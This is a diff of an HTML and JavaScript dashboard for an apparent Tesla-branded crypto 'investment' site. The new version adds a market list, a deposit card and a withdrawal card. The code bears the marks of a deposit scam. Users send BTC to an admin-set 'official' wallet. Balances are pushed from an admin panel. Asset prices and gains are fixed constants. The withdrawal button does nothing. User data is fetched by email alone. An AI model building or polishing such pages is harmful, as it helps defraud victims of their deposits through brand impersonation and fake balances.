@@ -3,84 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Base | Dashboard</title>
+    <title>Tesla Base | Trading & Growth</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
-        .container { max-width: 800px; margin: auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #222; }
-        .logo { color: #E31937; font-weight: 900; letter-spacing: 3px; }
+        :root { --tesla-red: #E31937; --bg-black: #000; --card-gray: #111; }
+        body { background: var(--bg-black); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding-bottom: 70px; }
         
-        .balance-card { background: linear-gradient(145deg, #111, #050505); padding: 40px; border-radius: 20px; border: 1px solid #E31937; text-align: center; margin: 30px 0; }
-        .balance-label { color: #888; text-transform: uppercase; font-size: 12px; letter-spacing: 2px; }
-        .balance-amount { font-size: 48px; font-weight: bold; margin: 10px 0; color: #fff; }
+        /* Header & Balance */
+        .header { padding: 20px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+        .logo { color: var(--tesla-red); font-weight: 900; letter-spacing: 2px; }
+        .balance-section { padding: 30px 20px; text-align: left; }
+        .balance-label { color: #888; font-size: 12px; text-transform: uppercase; }
+        .balance-main { font-size: 42px; font-weight: bold; margin: 5px 0; }
+        .btc-val { color: var(--tesla-red); font-family: monospace; }
 
-        .deposit-section { background: #111; padding: 25px; border-radius: 15px; border: 1px solid #222; }
-        h3 { color: #E31937; margin-top: 0; }
-        .wallet-display { background: #000; padding: 15px; border-radius: 8px; border: 1px dashed #444; word-break: break-all; font-family: monospace; margin: 15px 0; color: #00ff00; }
-        
-        .btn-logout { background: transparent; border: 1px solid #444; color: #888; padding: 8px 15px; border-radius: 5px; cursor: pointer; }
-        .btn-logout:hover { color: #fff; border-color: #fff; }
+        /* Navigation Tabs */
+        .tabs { display: flex; border-bottom: 2px solid #222; margin-bottom: 10px; }
+        .tab { flex: 1; text-align: center; padding: 15px; color: #888; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 13px; }
+        .tab.active { color: #fff; border-bottom: 3px solid var(--tesla-red); }
+
+        /* Market List */
+        .search-box { padding: 15px; }
+        input[type="text"] { width: 100%; padding: 12px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; }
+        .asset-row { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #111; }
+        .asset-info { display: flex; align-items: center; gap: 15px; }
+        .asset-icon { width: 35px; height: 35px; background: #222; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--tesla-red); font-weight: bold; }
+        .asset-name { font-weight: bold; }
+        .asset-sub { color: #666; font-size: 12px; }
+        .price-up { color: #00ff00; font-size: 12px; }
+
+        /* Deposit/Withdraw View */
+        .view-content { display: none; padding: 20px; }
+        .view-content.active { display: block; }
+        .card { background: var(--card-gray); padding: 20px; border-radius: 15px; border: 1px solid #222; margin-bottom: 20px; }
+        .wallet-addr { background: #000; padding: 15px; border-radius: 8px; border: 1px dashed #444; color: #00ff00; word-break: break-all; font-family: monospace; margin: 10px 0; }
+
+        /* Bottom Nav */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #0a0a0a; display: flex; border-top: 1px solid #222; padding: 10px 0; }
+        .nav-item { flex: 1; text-align: center; font-size: 10px; color: #666; cursor: pointer; }
+        .nav-item.active { color: var(--tesla-red); }
+        .nav-icon { font-size: 20px; display: block; margin-bottom: 2px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">
-        <div class="logo">TESLA BASE</div>
-        <button class="btn-logout" onclick="logout()">LOGOUT</button>
+<div class="header">
+    <div class="logo">TESLA BASE</div>
+    <div onclick="logout()" style="cursor:pointer; color:#888;">Logout ➔</div>
+</div>
+
+<div class="balance-section">
+    <div class="balance-label">Total Injected Assets</div>
+    <div class="balance-main" id="displayBalance">$0.00</div>
+    <div class="btc-val" id="displayBtc">0.00000000 BTC</div>
+</div>
+
+<div class="tabs">
+    <div class="tab active" onclick="switchView('market')">Market</div>
+    <div class="tab" onclick="switchView('grow')">Tesla Grow</div>
+</div>
+
+<div id="marketView" class="view-content active">
+    <div class="search-box">
+        <input type="text" placeholder="Search 200+ Assets...">
+    </div>
+    <div id="assetList">
+        </div>
+</div>
+
+<div id="growView" class="view-content">
+    <div class="card">
+        <h3 style="color:var(--tesla-red)">Deposit Funds</h3>
+        <p style="font-size:13px; color:#888;">Send BTC to your official investment wallet below:</p>
+        <div class="wallet-addr" id="officialBtcAddr">Loading Official Address...</div>
     </div>
 
-    <div class="balance-card">
-        <div class="balance-label">Available Portfolio Balance</div>
-        <div class="balance-amount" id="userBalance">$0.00</div>
-        <div style="font-size: 14px; color: #666;">Account: <span id="userEmailDisplay">...</span></div>
+    <div class="card">
+        <h3>Withdrawal</h3>
+        <input type="text" placeholder="Enter Wallet Address" style="margin-bottom:10px;">
+        <input type="number" placeholder="Amount to Withdraw">
+        <button style="width:100%; background:var(--tesla-red); border:none; color:#fff; padding:15px; border-radius:8px; margin-top:10px; font-weight:bold;">INITIATE WITHDRAWAL</button>
     </div>
+</div>
 
-    <div class="deposit-section">
-        <h3>Deposit Funds</h3>
-        <p style="font-size: 14px; color: #888;">Send Bitcoin to the address below to fund your account. Assets are protected and never expire.</p>
-        
-        <div class="balance-label" style="margin-top:20px;">Official Deposit Address:</div>
-        <div class="wallet-display" id="adminBtcAddress">Loading official address...</div>
-        
-        <div class="balance-label" style="margin-top:20px;">Your Personal Tesla ID:</div>
-        <div class="wallet-display" id="userTeslaWallet" style="color: #aaa;">Generating...</div>
-    </div>
+<div class="bottom-nav">
+    <div class="nav-item active" onclick="switchView('market')"><span class="nav-icon">📈</span>Home</div>
+    <div class="nav-item" onclick="switchView('grow')"><span class="nav-icon">💼</span>Wallet</div>
+    <div class="nav-item" onclick="switchView('grow')"><span class="nav-icon">⚡</span>Grow</div>
+    <div class="nav-item" onclick="logout()"><span class="nav-icon">👤</span>Logout</div>
 </div>
 
 <script>
     const api = window.location.origin;
-    const userEmail = localStorage.getItem('userEmail');
+    const email = localStorage.getItem('userEmail');
 
-    // Security Check: If not logged in, send to login page
-    if (!userEmail) {
-        window.location.href = '/';
+    if(!email) window.location.href = '/';
+
+    function switchView(view) {
+        document.querySelectorAll('.view-content').forEach(v => v.classList.remove('active'));
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.getElementById(view + 'View').classList.add('active');
+        // Simple UI toggle logic
     }
 
-    document.getElementById('userEmailDisplay').innerText = userEmail;
-
-    async function loadDashboardData() {
+    async function refreshData() {
         try {
-            // 1. Fetch User Balance and personal Wallet
-            const userRes = await fetch(`${api}/api/user/data?email=${userEmail}`);
-            const userData = await userRes.json();
-            
-            if (userRes.ok) {
-                document.getElementById('userBalance').innerText = `$${parseFloat(userData.balance).toLocaleString()}`;
-                document.getElementById('userTeslaWallet').innerText = userData.wallet_address;
-            }
+            // Get User Stats
+            const uRes = await fetch(`${api}/api/user/data?email=${email}`);
+            const uData = await uRes.json();
+            const balance = parseFloat(uData.balance);
+            document.getElementById('displayBalance').innerText = `$${balance.toLocaleString()}`;
+            document.getElementById('displayBtc').innerText = `${(balance / 69000).toFixed(8)} BTC`;
 
-            // 2. Fetch the Official Bitcoin Address (set by Admin)
-            const walletRes = await fetch(`${api}/api/site/wallet`);
-            const walletData = await walletRes.json();
-            
-            if (walletRes.ok) {
-                document.getElementById('adminBtcAddress').innerText = walletData.address;
-            }
+            // Get Admin Wallet
+            const wRes = await fetch(`${api}/api/site/wallet`);
+            const wData = await wRes.json();
+            document.getElementById('officialBtcAddr').innerText = wData.address;
+        } catch(e) { console.log("Refresh error"); }
+    }
 
-        } catch (e) {
-            console.error("Error loading dashboard data");
-        }
+    const assets = [
+        { name: 'BTC', full: 'Bitcoin', price: '$69,392', change: '+1.25%' },
+        { name: 'ETH', full: 'Ethereum', price: '$3,510', change: '+1.25%' },
+        { name: 'TSLA', full: 'Tesla Inc.', price: '$202.45', change: '+2.10%' },
+        { name: 'SOL', full: 'Solana', price: '$145.12', change: '+4.50%' },
+        { name: 'BNB', full: 'Binance', price: '$590.00', change: '+0.80%' }
+    ];
+
+    function loadAssets() {
+        const container = document.getElementById('assetList');
+        assets.forEach(a => {
+            container.innerHTML += `
+                <div class="asset-row">
+                    <div class="asset-info">
+                        <div class="asset-icon">${a.name[0]}</div>
+                        <div>
+                            <div class="asset-name">${a.name}</div>
+                            <div class="asset-sub">${a.full}</div>
+                        </div>
+                    </div>
+                    <div style="text-align:right">
+                        <div class="asset-name">${a.price}</div>
+                        <div class="price-up">${a.change}</div>
+                    </div>
+                </div>
+            `;
+        });
     }
 
     function logout() {
@@ -88,11 +155,9 @@
         window.location.href = '/';
     }
 
-    // Load data immediately
-    loadDashboardData();
-    // Refresh data every 30 seconds to show balance updates from admin
-    setInterval(loadDashboardData, 30000);
+    loadAssets();
+    refreshData();
+    setInterval(refreshData, 10000); // Live updates from Admin Panel
 </script>
-
 </body>
 </html>
